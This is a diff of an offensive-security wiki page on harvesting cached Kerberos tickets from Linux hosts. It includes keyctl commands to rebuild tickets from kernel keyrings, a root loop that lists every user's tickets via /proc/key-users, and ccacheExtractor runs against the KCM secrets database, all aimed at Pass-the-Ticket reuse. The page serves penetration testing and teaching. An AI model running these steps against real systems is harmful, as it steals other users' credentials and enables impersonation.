@@ -1,50 +1,68 @@
 ---
-authors: Hakumarachi
+authors: Hakumarachi, ShutdownRepo
 ---
 
 # 🛠️ Cached Kerberos tickets
 
 ## Theory
-### Introduction
-On Linux, **tickets can be stored in 3 different way** which indicate **where tickets can be found:**
 
-| Storage     | Details                                                                                                                                   |
-|-------------|-------------------------------------------------------------------------------------------------------------------------------------------|
-| **FILE**    | Stores tickets in files, by default under **/tmp** directory, in the form **krb5cc_%{uid}**                                               |
-| **KEYRING** | Stores tickets in a special space **in the Linux kernel only accessible for the user himself**                                            | 
-| **KCM**     | Stores ticket in a LDAP-Like database, by default at **/var/lib/sss/secrets/secrets.ldb** -> This is the default configuration using sssd | 
+Kerberos tickets can be cached on systems to allow for faster authentication without requiring users to re-enter credentials. Understanding how these tickets are stored is crucial for both defensive and offensive operations.
 
-The variable **default_ccache_name** in the **/etc/krb5.conf** file, which by default has read permission to any user, indicate the type of storage used by the system.
-
-> [!TIP] TIP
-> This value can be overwrited by a file inside /etc/krb5.conf.d/
-> 
-> By default, using sssd, the value is configured into **/etc/krb5.conf.d/kcm_default_ccache**
-
-## Practice
+### Storage Methods
 
 :::tabs
 
-== FILE
+== UNIX-like
 
-Tickets are accessible under the configured directory (**/tmp** by default). 
-Those files can directly be used with [Pass-the-tickets](../../kerberos/ptt.md) 
+On Linux and other UNIX-like systems, tickets can be stored in 3 different ways:
 
-== KEYRING
+| Storage     | Description                                                                                                                               |
+|-------------|-------------------------------------------------------------------------------------------------------------------------------------------|
+| **FILE**    | Stores tickets in files, typically under `/tmp` directory, in the format `krb5cc_%{uid}`                                                   |
+| **KEYRING** | Stores tickets in a dedicated kernel keyring space, only accessible to the ticket owner                                                     | 
+| **KCM**     | Stores tickets in an LDAP-like database, typically at `/var/lib/sss/secrets/secrets.ldb` (default when using SSSD)                        |
 
-> [!TIP] TIP
-> Keyring content can only be read by the content owner, root himself cannot read other user's keyring content.
-> 
-> But root can still use `su - $user` !
+The storage method is configured via the `default_ccache_name` parameter in `/etc/krb5.conf`, which is readable by all users.
 
-`keyctl`, which is almost always installed on target using keyring storage, can be used to read keyring content.
+> [!NOTE]
+> This configuration can be overridden by files in `/etc/krb5.conf.d/`. When using SSSD, the value is typically set in `/etc/krb5.conf.d/kcm_default_ccache`
+
+== Windows 🛠️
+
+On Windows systems, Kerberos tickets are stored in memory by the Local Security Authority Subsystem Service (LSASS) process.
+
+// TODO: Add more details
+
+:::
+
+## Practice
+
+### From UNIX-like systems
+
+:::tabs
+
+== FILE Storage
+
+Tickets are stored as files in the configured directory (default: `/tmp`). These files can be directly used for [Pass-the-Ticket](../../kerberos/ptt.md) attacks.
+
+== KEYRING Storage
+
+> [!NOTE]
+> While root cannot directly read other users' keyring content, they can still access tickets by using `su - $user`
+
+The `keyctl` utility (commonly pre-installed) can be used to read keyring content:
+
 ```bash
-#Fisrt get persistent keyring address
-[root@centos01 ~]# keyctl get_persistent @u
-30711432
+# Get persistent keyring address
+keyctl get_persistent @u
 
-# Show the keyring content at the previously found address
-[root@centos01 ~]# keyctl show 30711432
+# Show keyring content
+keyctl show 30711432
+```
+
+It will display the content of the keyring in a readable format.
+
+```
 Keyring
   30711432 ---lswrv      0 65534  keyring: _persistent.0
  127492740 --alswrv      0     0   \_ keyring: _krb
@@ -56,73 +74,68 @@ Keyring
  760223933 --alswrv      0     0           \_ user: __krb5_time_offsets__
 ```
 
-To recompose a kerberos ticket, values of `user: __krb5_princ__`, (110355059 in this example) here,  and `big_key: $SERVICE` (*161110247* in this example) are needed
+To reconstruct a Kerberos ticket, you need:
+1. The `__krb5_princ__` value (in the example above, it's `110355059`)
+2. The service key value (the `big_key` value. In the example above, it's `161110247`)
 
 ```bash
-# Get __krb5_princ__ value
+# Get principal value
 keyctl print $PRINCIPALS_ADDRESS
 
-# Get big_key: value
+# Get service key
 keyctl print $KEY_ADDRESS
-```
 
-This will output a hex string. Append this as bytes to the kerberos tickets header to retrieve a usable ticket :
+The result will be an hexadecimal string, that can be appended to the ticket header to reconstruct the full ticket.
 
-```bash
-# set ticket header
+# Reconstruct ticket
 HEADER='0504000c00010008ffffffff00000000'
-
-# set ticket principal
 PRINCIPALS=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')
-
-#set ticket key
-KEY=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')
-
-# Compose the ticket
+KEY=$(keyctl print $KEY_ADDRESS | awk -F : '{print $3}')
 ticket=$HEADER$PRINCIPALS$KEY
 
-# Write into file
-echo "$ticket" | xxd -r -p >> ticket.ccache
+# Save to file
+echo "$ticket" | xxd -r -p > ticket.ccache
 ```
 
-[CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can also be used to recompose the ticket from these values
+> [!TIP]
+> [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can automate this process:
+> ```bash
+> python3 ccacheExtractor.py keyring --principals $PRINCIPALS --key $KEY
+> ```
+
+A domain joined machine can cache lots of tickets from different users. It would be tedious to list them all manually.
+To list all available tickets, the `/proc/key-users` file can be used. It's readable by all users and contains the list of all users with persistent keyrings.
+
 ```bash
-# Recompose the ticket
-python3 ccacheExtractor.py keyring --principals $PRINCIPALS --key $KEY
+# List all tickets
+for uid in $(awk '{print$1}' /proc/key-users | tr -d :); do
+    res=$(KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1)
+    if [ $? -eq 0 ]; then
+        echo -e "\n=== UID $uid ==="
+        echo "$res"
+    fi
+done
+
+# Use a specific ticket
+KRB5CCNAME=KEYRING:persistent:$UID
 ```
 
-This file can then be used with [Pass-the-tickets](../../kerberos/ptt.md)
+> [!SUCCESS]
+> [keyringCCacheDumper](https://github.com/Hakumarachi/keyringCCacheDumper) can automatically extract all tickets.
 
-> [!TIP] TIP
-> Since a joined domain Linux can have a lot of user, it would be tedious to check for each possibility if a ticket is present in the keyring.
-> 
-> Fortunately, the file **/proc/key-users**, readable by everyone, contains the list of users who are using the keyring.
-> 
-> As root is then possible to list all ticket and use them directly from the system
+== KCM Storage
+
+KCM stores tickets in an LDB database file, typically only readable by root. [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can be used to extract tickets:
 
 ```bash
-# Print all tickets 
-for uid in `awk '{print$1}' /proc/key-users | tr -d :` ; do res=`KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1` ; if [ $? -eq 0 ] ; then echo ; echo === UID $uid === ; echo "$res" ; fi ; done
-
-# Or use a specific ticket
-KRB5CCNAME=KEYRING:persistent:$UID #Do kerberos stuff here
-```
-
-> [!WARNING] WARNING
-> Note that this method permit to list or directly use all tickets, but didn't allow to extract them to use them from another system
-
-> [!SUCCESS] SUCCESS
-> [keyringCCacheDumper](https://github.com/Hakumarachi/keyringCCacheDumper) can be used to extract all tickets automatically.
-
-== KCM
-
-When using KCM storage method all tickets are stored into the **.ldb** database file. By default this file is only readable by root user
-
-[CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can be used to extract all tickets from the database.
-```bash
-#Extract all ccache stored into .ldb database
+# Extract all tickets from LDB database
 python3 ccacheExtractor.py kcm ./secrets.ldb
 ```
 
-Extracted tickets can then be used with [Pass-the-tickets](../../kerberos/ptt.md)
+Extracted tickets can then be used with [Pass-the-cache](../../kerberos/ptc.md) or [Pass-the-tickets](../../kerberos/ptt.md) depending on the ticket type.
+
+### From Windows
+
+// TODO: Add more details
+
 :::
